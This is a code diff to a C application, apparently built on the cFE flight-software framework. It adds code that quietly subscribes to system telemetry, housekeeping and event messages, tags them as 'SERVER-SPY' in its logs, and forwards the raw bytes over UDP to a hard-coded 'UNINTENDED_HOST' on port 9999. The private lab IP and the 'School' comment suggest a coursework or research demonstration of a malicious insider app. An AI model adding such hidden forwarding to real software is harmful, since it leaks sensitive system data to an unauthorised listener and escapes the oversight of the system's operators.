@@ -11,9 +11,12 @@
 */
 #include <arpa/inet.h>
 #include "server_app.h"
-//#define UNINTENDED_HOST "192.168.0.130"  // Replace with actual IP
-#define UNINTENDED_HOST "10.88.207.238"
+#include "cfe_msgids.h"
+
+//#define UNINTENDED_HOST "192.168.0.130" 
+#define UNINTENDED_HOST "192.168.56.1" //School
 #define UNINTENDED_PORT 9999  // Port number
+
 
 /*
 ** Global Data
@@ -159,6 +162,12 @@ int32 SERVER_AppInit(void)
         return status;
     }
 
+    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(CFE_ES_APP_TLM_MID), SERVER_AppData.CmdPipe);
+    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(CFE_ES_HK_TLM_MID), SERVER_AppData.CmdPipe);
+    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(CFE_EVS_LONG_EVENT_MSG_MID), SERVER_AppData.CmdPipe);
+    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(CFE_SB_ALLSUBS_TLM_MID), SERVER_AppData.CmdPipe);
+
+
 
     /*
     ** TODO: Subscribe to any other messages here
@@ -249,16 +258,59 @@ void SERVER_ProcessCommandPacket(void)
             SERVER_ProcessGroundCommand();  // or custom handler
             break;
 
+        case CFE_EVS_LONG_EVENT_MSG_MID:
+        {
+            size_t msgSize = 0;
+            CFE_MSG_GetSize(SERVER_AppData.MsgPtr, &msgSize); // Retrieves the total size of the received message and stores it in msgSize
+
+            OS_printf("[SERVER-SPY] EVS MID 0x%04X received, size = %zu\n", CFE_SB_MsgIdToValue(MsgId), msgSize); // Prints a log with the recieved msgid and its size
+
+            // Dump first 64 bytes
+            uint8_t *raw = (uint8_t *)SERVER_AppData.MsgPtr; // Casts the incoming message pointer to a byte array inspection
+            size_t limit = (msgSize > 64) ? 64 : msgSize; // Sets a limit of 64 bytes for data dumping to avoid overflow
+
+            OS_printf("[SERVER-SPY] Raw message bytes: ");
+
+            for (size_t i = 0; i < limit; ++i) // Iterates through the message bytes and prints them in hex format
+            {
+                OS_printf("%02X ", raw[i]);
+            }
+            OS_printf("\n");
+
+            SERVER_ForwardToListener(SERVER_AppData.MsgPtr, msgSize); // Sends the entire raw message over UDP to a remote listener
+
+            break;
+        }
 
 
         /*
         ** All other invalid messages that this app doesn't recognize, 
         ** increment the command error counter and log as an error event.  
         */
-        default:
-            SERVER_AppData.HkTelemetryPkt.CommandErrorCount++;
-            CFE_EVS_SendEvent(SERVER_PROCESS_CMD_ERR_EID,CFE_EVS_EventType_ERROR, "SERVER: Invalid command packet, MID = 0x%x", CFE_SB_MsgIdToValue(MsgId));
-            break;
+       default:
+       {
+           size_t msgSize = 0;
+           CFE_MSG_GetSize(SERVER_AppData.MsgPtr, &msgSize);
+       
+           OS_printf("[SERVER] Unhandled MID: 0x%04X, size: %zu\n", CFE_SB_MsgIdToValue(MsgId), msgSize);
+       
+           // Print raw bytes (first 32 bytes max to avoid flooding)
+           uint8_t *raw = (uint8_t *)SERVER_AppData.MsgPtr;
+           size_t limit = (msgSize > 32) ? 32 : msgSize;
+       
+           OS_printf("[SERVER] Raw bytes: ");
+           for (size_t i = 0; i < limit; ++i)
+           {
+               OS_printf("%02X ", raw[i]);
+           }
+           OS_printf("\n");
+       
+           SERVER_AppData.HkTelemetryPkt.CommandErrorCount++;
+           CFE_EVS_SendEvent(SERVER_PROCESS_CMD_ERR_EID, CFE_EVS_EventType_ERROR,
+                             "SERVER: Invalid command packet, MID = 0x%x", CFE_SB_MsgIdToValue(MsgId));
+           break;
+       }
+       
     }
     return;
 } 
@@ -691,3 +743,26 @@ void SERVER_SendPingResponse(void)
                       "SERVER: Sent ping response to client, status = %d", status);
 }
 
+void SERVER_ForwardToListener(const void *data, size_t length)
+{
+    int sockfd;
+    struct sockaddr_in serverAddr; // Creates a UDP socket for sending data. The struct is predefined.
+
+
+
+    sockfd = socket(AF_INET, SOCK_DGRAM, 0); // Specifies that the address is using the IPv4 protocol.
+
+    if (sockfd < 0)
+    {
+        OS_printf("SERVER: Failed to create UDP socket\n");
+        return;
+    }
+
+    memset(&serverAddr, 0, sizeof(serverAddr));
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(UNINTENDED_PORT); // Sets the destination port for the UDP packet   .
+    inet_pton(AF_INET, UNINTENDED_HOST, &serverAddr.sin_addr); // Converts the string IP address to binary format and stores it in the server address structure
+
+    sendto(sockfd, data, length, 0, (struct sockaddr *)&serverAddr, sizeof(serverAddr)); // Sends the raw data buffer over UDP to the specified IP and port.
+    close(sockfd); // Closes the socket after sending the message.
+}
